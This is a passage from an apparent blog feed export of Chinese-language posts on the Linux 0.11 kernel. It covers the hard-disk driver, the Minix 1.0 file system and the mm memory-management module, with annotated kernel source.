class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 161</span></span><br><span class="line"><span class="comment">// 等待硬盘控制器就绪</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">controller_ready</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> retries=<span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环检测驱动器状态寄存器忙位(位 7)是否为 1，判断控制器是否处于忙状态</span></span><br><span class="line"><span class="keyword">while</span> (--retries &amp;&amp; (inb_p(HD_STATUS)&amp;<span class="number">0x80</span>));</span><br><span class="line"><span class="keyword">return</span> (retries);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测上次命令的结束状态</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">win_result</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=inb_p(HD_STATUS);<span class="comment">// 读取状态寄存器中的命令执行结束状态</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((i &amp; (BUSY_STAT | READY_STAT | WRERR_STAT | SEEK_STAT | ERR_STAT))</span><br><span class="line">== (READY_STAT | SEEK_STAT))<span class="comment">// 正常</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (i&amp;<span class="number">1</span>) i=inb(HD_ERROR);<span class="comment">// 如果 ERR_STAT 置位，读取错误寄存器</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 204</span></span><br><span class="line"><span class="comment">// 等待硬盘就绪</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">drive_busy</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line"><span class="comment">// 如果就绪或寻道结束标志位置位表示硬盘就绪，跳出循环</span></span><br><span class="line"><span class="keyword">if</span> (READY_STAT == (inb_p(HD_STATUS) &amp; (BUSY_STAT|READY_STAT)))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">i = inb(HD_STATUS);<span class="comment">// 读取状态寄存器中的命令执行结束状态</span></span><br><span class="line">i &amp;= BUSY_STAT | READY_STAT | SEEK_STAT;</span><br><span class="line"><span class="keyword">if</span> (i == READY_STAT | SEEK_STAT)<span class="comment">// 正常</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">printk(<span class="string">&quot;HD controller times out\n\r&quot;</span>);<span class="comment">// 等待超时</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新校正硬盘控制器</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reset_controller</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span>i;</span><br><span class="line"></span><br><span class="line">outb(<span class="number">4</span>,HD_CMD);<span class="comment">// 向控制寄存器端口发送复位控制字节</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) nop();<span class="comment">// 等待一段时间</span></span><br><span class="line">outb(hd_info[<span class="number">0</span>].ctl &amp; <span class="number">0x0f</span> ,HD_CMD);<span class="comment">// 发送正常控制字节(不禁止重试、重读)</span></span><br><span class="line"><span class="keyword">if</span> (drive_busy())<span class="comment">// 等待硬盘就绪</span></span><br><span class="line">printk(<span class="string">&quot;HD-controller still busy\n\r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((i = inb(HD_ERROR)) != <span class="number">1</span>)<span class="comment">// 读取错误寄存器内容，若不为 1 表示复位失败</span></span><br><span class="line">printk(<span class="string">&quot;HD-controller reset failed: %02x\n\r&quot;</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Minix 1.0 文件系统</title>
      <link href="/2020/05/04/Minix-1-0-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2020/05/04/Minix-1-0-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>下一个模块将是 fs(file system) 文件系统模块，在开始阅读源码之前，先对 Linux 0.11 中使用的 Minix 1.0 文件系统有个大致的概念，这对之后的代码阅读会有很大的帮助</p><p>文件系统是操作系统的重要组成部分，不论是用户文件还是操作系统产生的临时文件等都会通过文件系统来存储，在使用文件时，又要将文件内容从文件系统中读取到内存。因此文件系统需要使用高速设备来存储程序及数据，os 通常使用能存储大量信息的<strong>块设备</strong>来作为文件系统的设备</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>minix 文件系统由 <strong>6 个部分组成</strong>：引导块、超级块、i 节点位图块、逻辑块位图块、i 节点块、数据区。对于一个普通的磁盘块设备来说，这 6 个部分的分布如下（以 360KB 的磁盘为例）：</p><p><img src="../img/m1.png" alt="minix 文件系统"></p><p>图中一个格子表示一个盘块，<strong>每个盘块大小 1KB</strong>，故一共有 360 个盘块，现对这 6 个部分分开描述</p><br><h3 id="引导块"><a href="#引导块" class="headerlink" title="引导块"></a>引导块</h3><p>引导块是计算机加电启动时由 ROM BIOS 自动读入的存储执行代码和数据的盘块。但一个系统中并非所有盘设备都用于作为引导设备，对于不用引导的盘片，这一块可以不含代码，但必须留出这一块的空间以保证 minix 文件系统格式的统一。如果内核映像文件放在文件系统中，那么就可以在引导块内存放引导程序，由它来获取、加载文件系统中的内核映像文件</p><br><h3 id="超级块"><a href="#超级块" class="headerlink" title="超级块"></a>超级块</h3><p>超级块用于存放文件系统的结构信息，这些信息都有：</p><p><img src="../img/m2.png" alt="超级块"></p><p>其中有个新概念叫<strong>逻辑块</strong>，其实在 Minix 1.0 中，逻辑块与盘块没有区别，一个逻辑块也是 1KB，但在高版本的文件系统中，一个逻辑块通常表示物理上相邻的 x 个盘块（x 是 2 的幂次）。在超级块中，记录一个逻辑块对应多少盘块的字段是 s_log_zone_size（见上图）。由上图可知，逻辑块位图最多使用 8 块缓冲块（s_zmap[8]），每个缓冲块代表 8192（1K * 8bits）个盘块，因此 Minix 1.0 文件系统最大支持 64MB 的块设备</p><p>在 Linux 0.11 中，被加载的文件系统超级块保存在数组 super_block 中（定义在 fs/super.c），该数组有 8 项，表明 Linux 0.11 系统中最多可以同时加载 8 个文件系统。该数组在 mount_root 函数中被初始化，在 read_super 函数中会为新加载的文件系统设置一个超级块项，put_super 函数则负责释放数组中指定的超级块项</p><br><h3 id="i-节点块与数据区"><a href="#i-节点块与数据区" class="headerlink" title="i 节点块与数据区"></a>i 节点块与数据区</h3><p>i 节点是个结构体，用于存放设备上<strong>每个文件和目录名</strong>的相关信息，实际上文件系统中不是以直观的 [文件名/目录名] 的形式来组织文件层级关系，<strong>每个文件和目录都有自己对应的 i 节点</strong>，该结构体保存了文件和目录的一些信息，其中就包含了 [文件内容/目录块] 的<strong>索引信息</strong>。即<strong>文件里的实际内容</strong>及<strong>一个目录下有哪些文件</strong>保存在<strong>数据区</strong>的盘块里，而 [文件/目录名] 对应的 i 节点中有字段指向数据区中实际存储数据的盘块，从而可以获取到其数据</p><p>继续以 360 KB 磁盘为例，该文件系统中有 120 个 i 节点（创建文件系统时自动初始化的），每个 i 节点结构体大小是 32 个字节，所以一共需要 32 * 120 = 3840 个字节的连续空间来存储这 120 个 i 节点，舍入一下就是 4 个盘块。对照第一张图，在数据区前确实有 4 个连续的盘块作为 i 节点块</p><p>具体的 i 节点结构如下（i_nlinks 字段后面会讨论）：</p><p><img src="../img/m3.png" alt="i节点"></p><p>其中 i_zone[9] 数组就是用来存放文件所占用的数据区中的逻辑块号。前 7 项是直接块号，即前 7 项中的每一项指向一个数据区中的盘块；第 8 项是一次间接块号，即该项指向数据区中的一个盘块（1KB），而该盘块中的每两个字节（注意 i_zone 定义的类型为 short 数组）又指向一个数据区中的盘块，所以 i_zone 中的第 8 项实际可以获取到数据区中的 512（1024 / 2）个盘块；第 9 项是二次间接块号，与第 8 项稍有不同的是经一次间接后找到的盘块其又指向 512 个盘块，故实际上第 9 项可以获取到 512 * 512 个盘块。所以对于 Minix 1.0 文件系统来说，一个文件最大长度为 （7 + 512 + 512 * 512）* 1KB = 262663KB，示意图如下：</p><p><img src="../img/m4.png" alt="i_zone"></p><p>i_mode 字段也值得考究，它是一个 16 位的字段，用于保存文件的类型和访问权限属性（如 “ls -l” 命令查看到的 “drw-r–r–”），其每位的含义如下：</p><p><img src="../img/m5.png" alt="i_mode"></p><p>由此可以得知，其实我们常区分的文件和目录在宏观上并没有多少差别，它们都是文件，只不过是不同类型的文件罢了</p><br><h3 id="i-节点位图块与逻辑块位图块"><a href="#i-节点位图块与逻辑块位图块" class="headerlink" title="i 节点位图块与逻辑块位图块"></a>i 节点位图块与逻辑块位图块</h3><p>i 节点位图用于说明对应的 i 节点是否被使用，1 个比特位代表一个 i 节点，这也就能解释为什么一个盘块可以表示 8192 个 i 节点的使用情况。逻辑位图块与之相似，每个比特位代表对应数据区中盘块的使用情况。这两个块有个共同点，就是它们的最低比特位（位 0）都闲置不用（置为 1）</p><p>对于 360 KB 磁盘中的文件系统来说，120 个 i 节点对应 121 位比特位（包含闲置的最低比特位），故一个 i 节点位图块就能搞定。同时，360 个盘块除开非数据区的盘块外一共有 352 个，对应 353 位比特位（同理），因此一个逻辑块位图块也能搞定</p><br><h2 id="文件系统目录项结构"><a href="#文件系统目录项结构" class="headerlink" title="文件系统目录项结构"></a>文件系统目录项结构</h2><p>通过上面的描述我们可以得知，要想获取一个文件的内容，比如我想获取 /usr/root/hello.c 的内容，顺序查询 hello.c 对应 i 节点的 i_zone 数组即可。那么问题来了，该文件对应的 i 节点地址又从何知晓呢？</p><p>实际上，存在一种数据结构叫做目录项，其定义在 include/linux/fs.h：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME_LEN 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROOT_INO 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 157</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dir_entry</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> inode;</span><br><span class="line"><span class="keyword">char</span> name[NAME_LEN];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个目录项包含最大长度为 14 字节的文件名和 i 节点号，故一个目录项长度为 16 字节，一个盘块最多可以存放 64（1024 / 16）个目录项。而且<strong>根目录（/）的 i 节点号是确定的</strong>，为 1。所以如果我想获取 /usr/root/hello.c 的内容，首先就去到 1 号 i 节点（根目录），该 i 节点的 i_zone[0] 中保存了<strong>根目录下</strong>所有文件的目录项（如 bin、dev、root 等目录文件的目录项）。通过 usr 这个文件名就可以在目录项中找到其对应的 i 节点号，进而找到 /usr 对应的 i 节点，该 i 节点的 i_zone[0] 中也保存了 /usr 目录下所有文件的目录项，通过文件名 root 找到 /usr/root 对应的 i 节点，以此类推便可找到 /usr/root/hello.c 对应的 i 节点，文件名就是这样一层层地被解析到对应 i 节点的</p><br><blockquote><p>硬链接与符号链接</p></blockquote><p>现在就可以来说说 i 节点中的 i_nlinks 字段了，有多少个文件目录项指向该 i 节点，i_nlinks 的值就是多少，其还有一个名称叫做文件的<strong>硬链接数</strong>。由于目录项的存在，导致多个不同文件名可以同时表示一个文件（只要最后的 inode 值相同），只有当 i 节点的硬链接数为 0 时内核才会真正从磁盘上删除该文件的数据</p><p>想必在平时 “ls -a” 时会发现每个目录下都有两个特殊的目录文件 ‘.’ 和 ‘..’，’.’ 对应的目录项给出当前目录的 i 节点号，’..’ 对应的目录项给出了当前目录的父级目录的 i 节点号。所以对于一个目录（比如 /usr/bin）来说，其硬链接数最少为 2，一个是父级目录 /usr 的目录项中有一项指向 /usr/bin 的 i 节点，另一个则是 /usr/bin 目录下的 ‘.’。如果 /usr/bin 目录下还有子目录，则这些子目录的 ‘..’ 也会指向 /usr/bin 的 i 节点，故一个目录的硬链接数等于 <strong>2 + 子目录数</strong></p><p>另一个与之对应的名词是<strong>符号链接</strong>（ln -s），与硬链接不同，符号链接文件的数据块中存放的是作为<strong>链接对象的路径名字符串</strong>，访问符号链接文件时，内核会读取文件中的路径，然后去访问指定的文件，所以符号链接并不会增加目标文件的硬链接数</p><p>硬链接与符号链接有一个很关键的区别，那就是因为目录项中的 i 节点号仅能用于当前文件系统，故<strong>硬链接不能跨越文件系统</strong>。而符号链接则因其存储的是链接对象的路径名，故其可以不局限在一个文件系统中</p><br><h2 id="高速缓冲区"><a href="#高速缓冲区" class="headerlink" title="高速缓冲区"></a>高速缓冲区</h2><p>块设备的访问速度与内存的访问速度相差甚远，每次文件系统在访问块设备中数据时缓慢的 I/O 操作会对系统性能产生巨大的影响。为了提高系统性能，内核在内存中开辟了一个<strong>高速数据缓冲区</strong>，并将其划分为一个个<strong>与盘块大小相等的缓冲块</strong>来使用和管理，以期减少访问块设备的次数。</p><p>高速缓冲中存放着最近被使用过的各个块设备中的数据块，当需要从块设备中读取数据时，缓冲区管理程序会先到高速缓冲里找，如果找到了就直接拿来用，否则发出读块设备命令，将数据读到高速缓冲中。当需要把数据写到块设备中时，系统在高速缓冲中找一块空闲缓冲块对这些要写入的数据进行<strong>临时存放</strong>，直到进行设备数据同步时（如 sync 命令）才会真正将数据写到块设备中</p><p>之前在 main.c 源码阅读的文章中给出的内存分布图：</p><p><img src="../img/m6.png" alt="内存分布图"></p><p>其中的高速缓冲就是这里提到的高速数据缓冲区</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读-mm</title>
      <link href="/2020/04/27/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-mm/"/>
      <url>/2020/04/27/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-mm/</url>
      
        <content type="html"><![CDATA[<p>mm 是 Linux 0.11 内存管理的模块，一共两个文件 memory.c 与 page.s。开篇先来“再续前缘”，继续探讨写时复制技术的后半部分。</p><h2 id="写时复制之页错误"><a href="#写时复制之页错误" class="headerlink" title="写时复制之页错误"></a>写时复制之页错误</h2><p>上一篇文章提到了，当父/子进程其中之一对只读的内存页面进行写操作时，会产生页错误的异常，该异常处理程序负责将共享的内存页面复制到新内存页中，并重新构建该页表项，使其指向新内存页并可写。实际上，页错误异常不仅由写保护引发，还有可能是<strong>缺页</strong>引起的。页错误异常就定义在 page.s 中，该文件也就只有 page_fault 的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.globl page_fault</span><br><span class="line">/* 引发页错误的线性地址保存在控制寄存器 CR2 中 */</span><br><span class="line">page_fault:</span><br><span class="line">xchgl %eax,(%esp)/* 将出错码取到 eax 中 */</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs/* 保存现场 */</span><br><span class="line">movl $0x10,%edx</span><br><span class="line">mov %dx,%ds</span><br><span class="line">mov %dx,%es</span><br><span class="line">mov %dx,%fs/* 修改段寄存器，指向内核数据段 */</span><br><span class="line">movl %cr2,%edx/* 将引起页错误的线性地址放到 edx 中 */</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %eax/* 压参（页错误线性地址与错误码） */</span><br><span class="line">testl $1,%eax/* 页存在 P 位如果不为 0，表明不是由缺页引起的异常 */</span><br><span class="line">jne 1f/* 而是由写保护引发的异常，跳去调用 do_wp_page */</span><br><span class="line">call do_no_page/* 如果是缺页引发的异常，则调用 do_no_page */</span><br><span class="line">jmp 2f</span><br><span class="line">1:call do_wp_page</span><br><span class="line">2:addl $8,%esp/* 栈平衡 */</span><br><span class="line">pop %fs</span><br><span class="line">pop %es</span><br><span class="line">pop %ds</span><br><span class="line">popl %edx</span><br><span class="line">popl %ecx</span><br><span class="line">popl %eax/* 还原现场 */</span><br><span class="line">iret</span><br></pre></td></tr></table></figure><p>先来看由写保护引起的异常处理函数 do_wp_page（之后涉及的函数都在 memory.c 中）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 248</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_wp_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> error_code,<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"><span class="keyword">if</span> (CODE_SPACE(address))<span class="comment">// 这段代码本意是如果线性地址位于进程代码空间中，</span></span><br><span class="line">do_exit(SIGSEGV);<span class="comment">// 则终止程序，但 #if 0 表示该段代码不起作用</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">un_wp_page((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)<span class="comment">// 实际通过 un_wp_page 实现，参数是线性地址 address</span></span><br><span class="line">(((address&gt;&gt;<span class="number">10</span>) &amp; <span class="number">0xffc</span>) + (<span class="number">0xfffff000</span> &amp;<span class="comment">// 对应的页面在页表中的页表项指针</span></span><br><span class="line">*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) ((address&gt;&gt;<span class="number">20</span>) &amp;<span class="number">0xffc</span>)))));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 222</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">un_wp_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> * table_entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> old_page,new_page;</span><br><span class="line"></span><br><span class="line">old_page = <span class="number">0xfffff000</span> &amp; *table_entry;<span class="comment">// 获取页面物理地址</span></span><br><span class="line"><span class="comment">// 判断该页面是否在主内存区（LOW_MEM 值为 1MB，1MB 以上为主内存区），并且没有被共享</span></span><br><span class="line"><span class="keyword">if</span> (old_page &gt;= LOW_MEM &amp;&amp; mem_map[MAP_NR(old_page)]==<span class="number">1</span>) &#123;</span><br><span class="line">*table_entry |= <span class="number">2</span>;<span class="comment">// 加上写属性</span></span><br><span class="line">invalidate();<span class="comment">// 刷新 TLB</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 否则在主内存区申请空闲页给执行写操作的进程单独使用</span></span><br><span class="line"><span class="keyword">if</span> (!(new_page=get_free_page())) <span class="comment">// 如果没有空闲页则调用 oom 报错退出，oom 定义在 33 行</span></span><br><span class="line">oom();<span class="comment">// out of memory</span></span><br><span class="line"><span class="keyword">if</span> (old_page &gt;= LOW_MEM)<span class="comment">// 如果页面物理在主内存区，且被共享了</span></span><br><span class="line">mem_map[MAP_NR(old_page)]--;<span class="comment">// 将映射的数量减 1</span></span><br><span class="line">*table_entry = new_page | <span class="number">7</span>;<span class="comment">// 设置新页面可读写、存在</span></span><br><span class="line">invalidate();<span class="comment">// 刷新 TLB</span></span><br><span class="line">copy_page(old_page,new_page);<span class="comment">// 拷贝旧页面内容到新页面中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> copy_page(from,to) \</span></span><br><span class="line"><span class="meta">__asm__(<span class="meta-string">&quot;cld ; rep ; movsl&quot;</span>::<span class="meta-string">&quot;S&quot;</span> (from),<span class="meta-string">&quot;D&quot;</span> (to),<span class="meta-string">&quot;c&quot;</span> (1024))</span></span><br></pre></td></tr></table></figure><p>于是，写时复制的全貌就展现完毕了。由缺页引发的页错误处理涉及到块设备的知识，之后再做记录。</p><br><h2 id="mem-map数组"><a href="#mem-map数组" class="headerlink" title="mem_map数组"></a>mem_map数组</h2><p>之前涉及内存管理的代码都或多或少地有 mem_map 数组的影子，这个<strong>字符数组</strong>就是 Linux 用于判断 <strong>1MB 以上物理内存</strong>使用情况的，每个字节描述一个物理页面的占用状态，该字节的数值表示该页面被占用的次数，0 代表该页面空闲，100 代表该页面已被完全占用，不能再被分配/共享。Linux 0.11 的物理内存区域划分如下：</p><p><img src="../img/m1.png" alt="mem_map"></p><br><h2 id="mm-模块中的几类函数"><a href="#mm-模块中的几类函数" class="headerlink" title="mm 模块中的几类函数"></a>mm 模块中的几类函数</h2><h3 id="释放内存"><a href="#释放内存" class="headerlink" title="释放内存"></a>释放内存</h3><p>接着来看 memory.c 中还剩下的一些函数，可根据功能分为几类，首先是<strong>释放内存</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 106</span></span><br><span class="line"><span class="comment">// 该函数释放从 from 开始，长度为 size 字节的线性地址空间</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page_tables</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> from,<span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *pg_table;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * dir, nr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (from &amp; <span class="number">0x3fffff</span>)<span class="comment">// 检查 from 是否是 4MB 对齐</span></span><br><span class="line">panic(<span class="string">&quot;free_page_tables called with wrong alignment&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!from)<span class="comment">// 如果 from 为 0，则不允许释放内核空间</span></span><br><span class="line">panic(<span class="string">&quot;Trying to free up swapper memory space&quot;</span>);</span><br><span class="line">size = (size + <span class="number">0x3fffff</span>) &gt;&gt; <span class="number">22</span>;<span class="comment">// 对 size 进行 4MB 舍入，右移 22 位求出涉及到的页目录项数</span></span><br><span class="line">dir = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) ((from&gt;&gt;<span class="number">20</span>) &amp; <span class="number">0xffc</span>); <span class="comment">// 计算起始的页目录项地址</span></span><br><span class="line"><span class="keyword">for</span> ( ; size--&gt;<span class="number">0</span> ; dir++) &#123;<span class="comment">// 遍历涉及到的页目录项</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="number">1</span> &amp; *dir))<span class="comment">// 如果该项不存在（P 位为 0），则跳过</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">pg_table = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (<span class="number">0xfffff000</span> &amp; *dir);<span class="comment">// 页表基址</span></span><br><span class="line"><span class="keyword">for</span> (nr=<span class="number">0</span> ; nr&lt;<span class="number">1024</span> ; nr++) &#123;<span class="comment">// 遍历所有页表项</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &amp; *pg_table)<span class="comment">// 如果该页存在</span></span><br><span class="line">free_page(<span class="number">0xfffff000</span> &amp; *pg_table);<span class="comment">// 释放该页所占用的空间</span></span><br><span class="line">*pg_table = <span class="number">0</span>;<span class="comment">// 页表项置空</span></span><br><span class="line">pg_table++;</span><br><span class="line">&#125;</span><br><span class="line">free_page(<span class="number">0xfffff000</span> &amp; *dir);<span class="comment">// 释放该页表所占用的空间</span></span><br><span class="line">*dir = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">invalidate();<span class="comment">// 刷新 TLB</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 90</span></span><br><span class="line"><span class="comment">// 释放一页空间实际上就是将 mem_map 数组对应项的映射数减 1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (addr &lt; LOW_MEM) <span class="keyword">return</span>;<span class="comment">// 不释放内核占用的空间</span></span><br><span class="line"><span class="keyword">if</span> (addr &gt;= HIGH_MEMORY)<span class="comment">// 对于超出内存大小的地址，直接死机</span></span><br><span class="line">panic(<span class="string">&quot;trying to free nonexistent page&quot;</span>);</span><br><span class="line">addr -= LOW_MEM;</span><br><span class="line">addr &gt;&gt;= <span class="number">12</span>;<span class="comment">// 求出在 mem_map 数组中的索引</span></span><br><span class="line"><span class="keyword">if</span> (mem_map[addr]--) <span class="keyword">return</span>;<span class="comment">// 如果映射数不为 0，则减 1 后返回</span></span><br><span class="line">mem_map[addr]=<span class="number">0</span>;<span class="comment">// 否则置 0 并死机</span></span><br><span class="line">panic(<span class="string">&quot;trying to free free page&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="获取空闲页面"><a href="#获取空闲页面" class="headerlink" title="获取空闲页面"></a>获取空闲页面</h3><p>第二类有关<strong>获取空闲页面</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 